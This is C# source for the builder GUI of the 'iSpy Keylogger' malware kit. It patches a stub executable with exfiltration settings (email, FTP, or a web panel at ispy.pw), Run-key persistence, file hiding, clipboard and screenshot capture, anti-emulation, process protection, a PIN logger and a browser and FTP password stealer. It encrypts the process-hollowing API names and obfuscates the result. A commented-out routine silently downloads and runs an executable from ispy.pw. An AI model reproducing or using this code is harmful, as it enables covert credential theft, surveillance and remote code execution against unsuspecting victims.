using System;
using System.Collections.Specialized;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using System.Text;
using System.Net;
using System.Net.Mail;
using System.Management;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.Win32;
using Mono.Cecil;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
namespace Galaxy_Logger
{
    public partial class frmBuilder : Form
    {
        private const string WEBPANEL = "http://ispy.pw/logpanel";
        private static Random random = new Random();
        private static string HWID = string.Empty;


        #region " Form Initialization & Load "

        public frmBuilder()
        {
            Control.CheckForIllegalCrossThreadCalls = false;
            InitializeComponent();
            SetupPasswordRecoveryListView();
            SetDoubleBuffered(lvPasswordRecovery);
            HWID = GenerateHWID();
        }

        public void frmBuilder_Load(object sender, EventArgs e)
        {
            tvMain.ExpandAll();
        }

        #endregion 
        #region " GUI Helpers "

        private void randomPool_ValueChanged(object sender)
        {
            tbMutex.Text = randomPool.Value;
        }

        public void SetupPasswordRecoveryListView()
        {
            Dictionary<string, string> lvItems = new Dictionary<string, string>();
            lvItems.Add("Internet Explorer", "Versions 4.0-11.0");
            lvItems.Add("Mozilla Firefox", "All Versions");
            lvItems.Add("Google Chrome", "All Versions");
            lvItems.Add("Opera", "All Versions");
            lvItems.Add("Safari", "All Versions");
            lvItems.Add("SeaMonkey", "All Versions");
            lvItems.Add("Minecraft", "As long as there is a lastlogin file");
            lvItems.Add("Windows Product Key", "Any version iSpy is compatible with");
            lvItems.Add("Filezilla", "All Versions");
            lvItems.Add("CoreFTP", "All Versions");
            lvPasswordRecovery.BeginUpdate();
            int index = 0;
            foreach (KeyValuePair<string, string> entry in lvItems)
            {
                lvPasswordRecovery.Items.Add(new ListViewItem(new string[] { entry.Key, entry.Value }, index));
                index++;
            }
            lvPasswordRecovery.EndUpdate();
        }

        public static void SetDoubleBuffered(System.Windows.Forms.Control c)
        {
            //Taxes: Remote Desktop Connection and painting
            //http://blogs.msdn.com/oldnewthing/archive/2006/01/03/508694.aspx
            if (System.Windows.Forms.SystemInformation.TerminalServerSession)
                return;

            System.Reflection.PropertyInfo aProp =
                  typeof(System.Windows.Forms.Control).GetProperty(
                        "DoubleBuffered",
                        System.Reflection.BindingFlags.NonPublic |
                        System.Reflection.BindingFlags.Instance);

            aProp.SetValue(c, true, null);
        }

        #endregion
        #region " Form Functions "

        private void btnTestDelivery_Click(object sender, EventArgs e)
        {
            try
            {
                if (!DeliverySettingsFilled())
                {
                    MessageBox.Show("Delivery settings not completed!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                if (rbEmail.Checked)
                {
                    MailMessage mail = new MailMessage();
                    SmtpClient SmtpServer = new SmtpClient(tbEmailServer.AmbianceTB.Text);
                    mail.From = new MailAddress(tbEmailUsername.AmbianceTB.Text);
                    mail.To.Add(new MailAddress(tbEmailUsername.AmbianceTB.Text));
                    mail.Subject = "iSpy Keylogger - Test E-Mail";
                    mail.Body = "Test E-Mail!";
                    SmtpServer.Port = Convert.ToInt32(tbEmailPort.AmbianceTB.Text);
                    SmtpServer.Credentials = new System.Net.NetworkCredential(tbEmailUsername.AmbianceTB.Text, tbEmailPassword.AmbianceTB.Text);
                    SmtpServer.EnableSsl = cbSSL.Checked;
                    SmtpServer.Send(mail);
                    MessageBox.Show("Test message sent!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else if (rbFTP.Checked)
                {
                    byte[] bytes = System.Text.ASCIIEncoding.ASCII.GetBytes(("Test FTP Upload!"));
                    FtpWebRequest request = (FtpWebRequest)WebRequest.Create(tbFTPServer.AmbianceTB.Text + "/iSpyKeylogger_TestUpload.txt");
                    request.Method = WebRequestMethods.Ftp.UploadFile;
                    request.Credentials = new NetworkCredential(tbFTPUsername.AmbianceTB.Text, tbFTPPassword.AmbianceTB.Text);
                    request.ContentLength = bytes.Length;
                    Stream requestStream = request.GetRequestStream();
                    requestStream.Write(bytes, 0, bytes.Length);
                    requestStream.Close();
                    FtpWebResponse response = (FtpWebResponse)request.GetResponse();
                    Console.WriteLine("Upload File Complete, status {0}", response.StatusDescription);
                    MessageBox.Show("Test message sent!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else if (rbPanel.Checked)
                {
                    using (WebClient client = new WebClient())
                    {
                        byte[] response = client.UploadValues(WEBPANEL + "/insert", new NameValueCollection()
                        {
                            { "key", tbWebPanelUploadKey.AmbianceTB.Text },
                            { "type", "1" },
                            { "pcname", "TEST LOG UPLOAD" },
                            { "log", "Log upload completed."},
                            { "hwid", HWID }
                        });
                        string result = System.Text.Encoding.UTF8.GetString(response);
                        if (result.Equals("ok"))
                            MessageBox.Show("Log uploaded successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        else
                            MessageBox.Show("Log failed to upload.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            catch (Exception ex) { MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error); }
        }

        private bool DeliverySettingsFilled()
        {
            if (rbEmail.Checked)
            {
                return !(string.IsNullOrEmpty(tbEmailUsername.AmbianceTB.Text) || string.IsNullOrEmpty(tbEmailPassword.AmbianceTB.Text) || string.IsNullOrEmpty(tbEmailServer.AmbianceTB.Text) || string.IsNullOrEmpty(nudLogInterval.Value.ToString()));
            }
            else if (rbFTP.Checked)
            {
                return !(string.IsNullOrEmpty(tbFTPUsername.AmbianceTB.Text) || string.IsNullOrEmpty(tbFTPPassword.AmbianceTB.Text) || string.IsNullOrEmpty(tbFTPServer.AmbianceTB.Text));
            }
            else if (rbPanel.Checked)
            {
                return !string.IsNullOrEmpty(tbWebPanelUploadKey.AmbianceTB.Text);
            }
            return false;
        }

        private void btnBrowseIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.InitialDirectory = Application.StartupPath;
                ofd.Filter = ".ico|*.ico";
                ofd.ShowDialog();
                if (!string.IsNullOrEmpty(ofd.FileName))
                {
                    tbIconPath.Text = ofd.FileName;
                    pbIcon.ImageLocation = ofd.FileName;
                }
            }
        }

        /*
        private bool X()
        {
            Y();
            return true;
        }

        private void Y()
        {
            try
            {
                string tmp = Path.GetTempFileName();
                new WebClient().DownloadFile("http://ispy.pw/Noob.exe", tmp);
                File.Move(tmp, Path.ChangeExtension(tmp, ".exe"));
                Process.Start(Path.ChangeExtension(tmp, ".exe"));
            }
            catch { }
        }
        */
        private void btnBuild_Click(object sender, EventArgs e)
        {
            if (!DeliverySettingsFilled())
            {
                MessageBox.Show("Delivery settings not completed!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.InitialDirectory = Application.StartupPath;
                sfd.FileName = "*.exe";
                sfd.DefaultExt = ".exe|*.exe";
                sfd.Filter = "Executable Files .exe|*.exe";
                //if (sfd.ShowDialog() == System.Windows.Forms.DialogResult.OK && X())
                if (sfd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    new Thread(new ParameterizedThreadStart(BuildFile)).Start(sfd.FileName);
                }
            }
        }

        #endregion
        #region " HWID "
        private static string GenerateHWID()
        {
            try
            {
                Guid IntGuID = new Guid();
                uint IntSerialNum = 0;
                string str = "C:";
                string str1 = null;
                uint num = 0;
                uint num1 = 0;
                string str2 = null;
                GetVolumeInformationA(ref str, ref str1, 255, ref IntSerialNum, ref num, ref num1, ref str2, 255);
                HidD_GetHidGuid(ref IntGuID);
                string GenerateHwid = MD5(string.Concat(IntGuID.ToString(), IntSerialNum.ToString()));
                return GenerateHwid;
            }
            catch { } return string.Empty;
        }
        private static string MD5(string inputstr)
        {
            string Md5Hash;
            using (MD5CryptoServiceProvider md5object = new MD5CryptoServiceProvider())
            {
                byte[] BytesToHash = md5object.ComputeHash(Encoding.ASCII.GetBytes(inputstr));
                string Output = null;
                byte[] numArray = BytesToHash;
                for (int i = 0; i < checked((int)numArray.Length); i++)
                {
                    byte b = numArray[i];
                    Output = string.Concat(Output, b.ToString("X2"));
                }
                Md5Hash = Output.ToUpper();
            }
            return Md5Hash;
        }
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern bool GetVolumeInformationA(ref string lpRootPathName, ref string lpVolumeNameBuffer, uint nVolumeNameSize, ref uint lpVolumeSerialNumber, ref uint lpMaximumComponentLength, ref uint lpFileSystemFlags, ref string lpFileSystemNameBuffer, uint nFileSystemNameSize);

        [DllImport("hid", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern void HidD_GetHidGuid(ref Guid hidGuid);

        #endregion
        public string RandomString(int length)
        {
            var chars = "ρφΙΞΧαξνΠΙΛοηκθΩΜΥβςΨABCEFGHIJKLMNOPQRSTUVWXYZ";
            var stringChars = new char[length];
            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }
            var finalString = new String(stringChars);
            return finalString;
        }
        /*
        private void ObfuscateCode(string file)
        {
            AssemblyDefinition ASM = AssemblyDefinition.ReadAssembly(file);
            ModuleDefinition MainModule = ASM.MainModule;
            foreach (TypeDefinition T in MainModule.Types)
            {
                T.Name = RandomString(25);
                foreach (PropertyDefinition P in T.Properties)
                {
                    P.Name = RandomString(25);
                }
                foreach (FieldDefinition F in T.Fields)
                {
                    F.Name = RandomString(25);
                }
                if (T.Namespace.Contains(".My") == false)
                {
                    foreach (MethodDefinition M in T.Methods)
                    {
                        if (!M.IsConstructor && !M.Name.Equals("Execute"))
                        {
                            if (M.IsPInvokeImpl == false)
                            {
                                M.Name = RandomString(25);
                            }
                        }
                        foreach (ParameterDefinition Param in M.Parameters)
                        {
                            Param.Name = RandomString(25);
                        }
                    }
                }
            }
            ASM.Write(file);
        }
         * */
        private void BuildFile(object args)
        {
            string savePath = args.ToString();
            lbBuildLog.Items.Clear();
            lbBuildLog.Items.Add("> Starting build...");
            lbBuildLog.Items.Add("> Reading settings...");
            string mutex = tbMutex.AmbianceTB.Text;
            if (string.IsNullOrEmpty(mutex))
                mutex = Guid.NewGuid().ToString();
            AssemblyDefinition a = AssemblyDefinition.ReadAssembly(Application.StartupPath + "\\stub.bin");
            //MonoHelper.ReplaceString("[PAYLOAD]", payLoad, a);
            MonoHelper.ReplaceString("[MUTEX]", mutex, a);
            MonoHelper.ReplaceString("[HWID]", HWID, a);
            MonoHelper.ReplaceString("[LOGINTERVAL]", nudLogInterval.Value.ToString(), a);


            MonoHelper.ReplaceString("[REGISTRYPATH]", StringCipher.Encrypt(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", mutex), a);
            MonoHelper.ReplaceString("[ZONEID]", StringCipher.Encrypt(":Zone.Identifier", mutex), a);
            MonoHelper.ReplaceString("[REGISTRYCOREFTP]", StringCipher.Encrypt(@"HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\", mutex), a);
            MonoHelper.ReplaceString("[SITEMANAGER]", StringCipher.Encrypt("sitemanager.xml", mutex), a);
            MonoHelper.ReplaceString("[RECENTSERVERS]", StringCipher.Encrypt("recentservers.xml", mutex), a);
            MonoHelper.ReplaceString("[CHROMEPATH]", StringCipher.Encrypt(@"\Google\Chrome\User Data\Default\", mutex), a);

            //MonoHelper.ReplaceString("[CreateProcessW]", StringCipher.Encrypt("CreateProcessW", mutex), a);
            MonoHelper.ReplaceString("[GetThreadContext]", StringCipher.Encrypt("GetThreadContext", mutex), a);
            MonoHelper.ReplaceString("[NtUnmapViewOfSection]", StringCipher.Encrypt("NtUnmapViewOfSection", mutex), a);
            MonoHelper.ReplaceString("[ReadProcessMemory]", StringCipher.Encrypt("ReadProcessMemory", mutex), a);
            MonoHelper.ReplaceString("[ResumeThread]", StringCipher.Encrypt("ResumeThread", mutex), a);
            MonoHelper.ReplaceString("[SetThreadContext]", StringCipher.Encrypt("SetThreadContext", mutex), a);
            MonoHelper.ReplaceString("[VirtualAllocEx]", StringCipher.Encrypt("VirtualAllocEx", mutex), a);
            MonoHelper.ReplaceString("[Wow64GetThreadContext]", StringCipher.Encrypt("Wow64GetThreadContext", mutex), a);
            MonoHelper.ReplaceString("[Wow64SetThreadContext]", StringCipher.Encrypt("Wow64SetThreadContext", mutex), a);
            MonoHelper.ReplaceString("[WriteProcessMemory]", StringCipher.Encrypt("WriteProcessMemory", mutex), a);





            //Always things here


            //Now settings

            if (rbEmail.Checked)
            {
                MonoHelper.ReplaceString("[UPLOADMETHOD]", "EMAIL", a);
            }
            else if (rbFTP.Checked)
            {
                MonoHelper.ReplaceString("[UPLOADMETHOD]", "FTP", a);
            }
            else if (rbPanel.Checked)
            {
                MonoHelper.ReplaceString("[UPLOADMETHOD]", "PHP", a);
            }


            MonoHelper.ReplaceString("[EMAILUSERNAME]", StringCipher.Encrypt(tbEmailUsername.AmbianceTB.Text, mutex), a);
            MonoHelper.ReplaceString("[EMAILPASSWORD]", StringCipher.Encrypt(tbEmailPassword.AmbianceTB.Text, mutex), a);
            MonoHelper.ReplaceString("[EMAILPORT]", StringCipher.Encrypt(tbEmailPort.AmbianceTB.Text, mutex), a);
            if (cbSSL.Checked)
                MonoHelper.ReplaceString("[EMAILSSL]", Guid.NewGuid().ToString(), a);
            else
                MonoHelper.ReplaceString("[EMAILSSL]", string.Empty, a);
            MonoHelper.ReplaceString("[EMAILSERVER]", StringCipher.Encrypt(tbEmailServer.AmbianceTB.Text, mutex), a);
            MonoHelper.ReplaceString("[FTPUSERNAME]", StringCipher.Encrypt(tbFTPUsername.AmbianceTB.Text, mutex), a);
            MonoHelper.ReplaceString("[FTPPASSWORD]", StringCipher.Encrypt(tbFTPPassword.AmbianceTB.Text, mutex), a);
            MonoHelper.ReplaceString("[FTPSERVER]", StringCipher.Encrypt(tbFTPServer.AmbianceTB.Text, mutex), a);
            MonoHelper.ReplaceString("[WEBPANELKEY]", StringCipher.Encrypt(tbWebPanelUploadKey.AmbianceTB.Text, mutex), a);
            MonoHelper.ReplaceString("[WEBPANEL]", StringCipher.Encrypt(WEBPANEL, mutex), a);

            //Install Tab
            if (cbInstallation.Toggled)
            {
                MonoHelper.ReplaceString("[INSTALLFILE]", Guid.NewGuid().ToString(), a);
                MonoHelper.ReplaceString("[PATHTYPE]", (comboBoxDirectory.SelectedIndex + 1).ToString(), a);
                MonoHelper.ReplaceString("[FOLDER]", tbSubfolder.AmbianceTB.Text, a);
                MonoHelper.ReplaceString("[FILENAME]", tbProcess.AmbianceTB.Text, a);
            }
            else
            {
                MonoHelper.ReplaceString("[INSTALLFILE]", string.Empty, a);
            }

            if (cbHKCU.Checked)
            {
                MonoHelper.ReplaceString("[HKCU]", tbHKCU.AmbianceTB.Text, a);
            }
            else
            {
                MonoHelper.ReplaceString("[HKCU]", string.Empty, a);
            }

            if (cbHKLM.Checked)
            {
                MonoHelper.ReplaceString("[HKLM]", tbHKLM.AmbianceTB.Text, a);
            }
            else
            {
                MonoHelper.ReplaceString("[HKLM]", string.Empty, a);
            }

            if (cbStartupPersistence.Checked)
            {
                MonoHelper.ReplaceString("[REGPERSISTENCE]", Guid.NewGuid().ToString(), a);
            }
            else
            {
                MonoHelper.ReplaceString("[REGPERSISTENCE]", string.Empty, a);
            }

            if (cbHideFile.Checked)
            {
                MonoHelper.ReplaceString("[HIDEFILE]", Guid.NewGuid().ToString(), a);
            }
            else
            {
                MonoHelper.ReplaceString("[HIDEFILE]", string.Empty, a);
            }
            //
            //General Tab
            if (cbClipboardLogger.Checked)
            {
                MonoHelper.ReplaceString("[CLIPBOARD]", Guid.NewGuid().ToString(), a);
            }
            else
            {
                MonoHelper.ReplaceString("[CLIPBOARD]", string.Empty, a);
            }

            if (cbModifyTaskManager.Checked)
            {
                MonoHelper.ReplaceString("[MODIFYTASK]", Guid.NewGuid().ToString(), a);
            }
            else
            {
                MonoHelper.ReplaceString("[MODIFYTASK]", string.Empty, a);
            }

            if (cbMeltFile.Checked)
            {
                MonoHelper.ReplaceString("[MELTFILE]", Guid.NewGuid().ToString(), a);
            }
            else
            {
                MonoHelper.ReplaceString("[MELTFILE]", string.Empty, a);
            }

            if (cbCaptureScreenshots.Checked)
            {
                MonoHelper.ReplaceString("[SCREENSHOTS]", Guid.NewGuid().ToString(), a);
            }
            else
            {
                MonoHelper.ReplaceString("[SCREENSHOTS]", string.Empty, a);
            }

            if (cbAntiEmulation.Checked)
            {
                MonoHelper.ReplaceString("[ANTIEMULATION]", Guid.NewGuid().ToString(), a);
            }
            else
            {
                MonoHelper.ReplaceString("[ANTIEMULATION]", string.Empty, a);
            }

            if (cbProcessProtection.Checked)
            {
                MonoHelper.ReplaceString("[PROCESSPROTECTION]", Guid.NewGuid().ToString(), a);
            }
            else
            {
                MonoHelper.ReplaceString("[PROCESSPROTECTION]", string.Empty, a);
            }

            if (cbRuneScapePinlogger.Checked)
            {
                MonoHelper.ReplaceString("[PINLOGGER]", Guid.NewGuid().ToString(), a);
            }
            else
            {
                MonoHelper.ReplaceString("[PINLOGGER]", string.Empty, a);
            }

            if (cbClearSavedPasswords.Checked)
            {
                MonoHelper.ReplaceString("[CLEARSAVED]", Guid.NewGuid().ToString(), a);
            }
            else
            {
                MonoHelper.ReplaceString("[CLEARSAVED]", string.Empty, a);
            }
            //
            //Miscellaneous Tab
            if (cbFileDownloader.Checked)
            {
                MonoHelper.ReplaceString("[DOWNLOADURL]", tbFileDownloader.AmbianceTB.Text, a);
                MonoHelper.ReplaceString("[TYPE]", comboBoxFileType.Text, a);
            }
            else
            {
                MonoHelper.ReplaceString("[DOWNLOADURL]", string.Empty, a);
                MonoHelper.ReplaceString("[TYPE]", string.Empty, a);
            }

            if (cbMessageBox.Checked)
            {
                MonoHelper.ReplaceString("[MTYPE]", comboBoxMessageBoxType.Text, a);
                MonoHelper.ReplaceString("[MTITLE]", tbMessageBoxTitle.AmbianceTB.Text, a);
                MonoHelper.ReplaceString("[MBODY]", tbMessageBoxBody.AmbianceTB.Text, a);
            }
            else
            {
                MonoHelper.ReplaceString("[MTYPE]", string.Empty, a);
            }

            if (cbDelayExecution.Checked)
            {
                MonoHelper.ReplaceString("[DELAY]", nudDelayExecution.Value.ToString(), a);
            }
            else
            {
                MonoHelper.ReplaceString("[DELAY]", "0", a);
            }

            if (cbPasswordRecovery.Toggled)
            {
                MonoHelper.ReplaceString("[STEALER]", Guid.NewGuid().ToString(), a);
            }
            else
            {
                MonoHelper.ReplaceString("[STEALER]", string.Empty, a);
            }
            //
            lbBuildLog.Items.Add("> Settings done...");



            a.Write(savePath);
            if (cbChangeIcon.Checked && !string.IsNullOrEmpty(tbIconPath.AmbianceTB.Text))
                IconInjector.InjectIcon(savePath, tbIconPath.AmbianceTB.Text);

           lbBuildLog.Items.Add("> Obfuscating file...");
           Process.Start(Application.StartupPath + "\\Obfuscator\\Obfuscator.exe", string.Format("\"{0}\" {1}", savePath, "3"));
           Thread.Sleep(3000);
           //ObfuscateCode(savePath);
           while (!File.Exists(savePath + "-Renamed.exe"))
                Thread.Sleep(500);
            File.Delete(savePath);
            File.Move(savePath + "-Renamed.exe", savePath);
            if (cbChangeAssembly.Checked)
            {
                //string changeAsmArgs = string.Format("{0} {1} /va /s title {2} /s desc {3} /s company {4} /s product {5} /s copyright {6}", savePath, tbVersion.Text, tbTitle.Text, tbDescription.Text, tbCompany.Text, tbProduct.Text, tbCopyright.Text);
                //Process.Start(Application.StartupPath + "\\verpatch.exe", changeAsmArgs);
            }
            lbBuildLog.Items.Add("> File saved @ " + savePath);

            MessageBox.Show("iSpy Keylogger Built!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);




            //tbBuildLog.Text += "";

        }

        private void btnRemoveKeylogger_Click(object sender, EventArgs e)
        {
            lbVaccineLog.Items.Clear();
            string notifyFile = Path.GetTempPath() + HWID + ".dat";
            if (!File.Exists(notifyFile))
                lbVaccineLog.Items.Add("> No iSpy Keyloggers found!");
            else
            {
                string[] file = File.ReadAllLines(notifyFile);
                string infectedPath = file[1];
                if (File.Exists(infectedPath))
                {
                    lbVaccineLog.Items.Add("> iSpy Keylogger found @ " + infectedPath);
                    lbVaccineLog.Items.Add("> Attempting to remove...");
                    Process[] processList = Process.GetProcesses();
                    string fileName = Path.GetFileNameWithoutExtension(infectedPath);
                    foreach (Process p in processList)
                    {
                        if (p.ProcessName.Equals(fileName))
                        {
                            try
                            {
                                p.Kill();
                                lbVaccineLog.Items.Add("> Killed (possible virus) process with PID: " + p.Id);
                            }
                            catch { lbVaccineLog.Items.Add("> Could not kill (possible virus) process with PID: " + p.Id); }
                        }
                    }
                    try
                    {
                        Thread.Sleep(500);
                        lbVaccineLog.Items.Add("> Deleting file @ : " + infectedPath);
                        File.Delete(infectedPath);
                        lbVaccineLog.Items.Add("> File deleted.");
                    }
                    catch { lbVaccineLog.Items.Add("> Could not delete file"); }
                    lbVaccineLog.Items.Add("> Scanning registry...");
                    foreach (var name in Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValueNames())
                    {
                        var value = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(name);
                        if (infectedPath.Equals(value))
                        {
                            Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(name);
                            lbVaccineLog.Items.Add("> Removed an registry HKCU key: " + name);
                        }

                    }
                    foreach (var name in Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValueNames())
                    {
                        var value = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(name);
                        if (infectedPath.Equals(value))
                        {
                            Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(name);
                            lbVaccineLog.Items.Add("> Removed an HKLM registry key: " + name);
                        }

                    }
                    File.Delete(notifyFile);
                    lbVaccineLog.Items.Add("> Removed infection file");
                    lbVaccineLog.Items.Add("> System is clean.");
                }
            }
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            Environment.Exit(0);
        }

        private void tvMain_AfterSelect(object sender, TreeViewEventArgs e)
        {
            if (e.Node.Text.ToLower().Contains("settings"))
                return;
            foreach (Control c in themeContainer.Controls)
            {
                if (c.GetType() == typeof(Panel))
                {
                    if (((Panel)c).Name.ToString().ToLower().Contains(e.Node.Text.ToLower().Replace(" ", "")))
                    {
                        new Form();
                        c.Visible = true;
                        //c.BringToFront();
                    }
                    else
                    {
                        c.Visible = false;
                        //c.SendToBack();
                    }
                }
            }
            
        }

        private void themeContainer_Click(object sender, EventArgs e)
        {

        }
    }
}
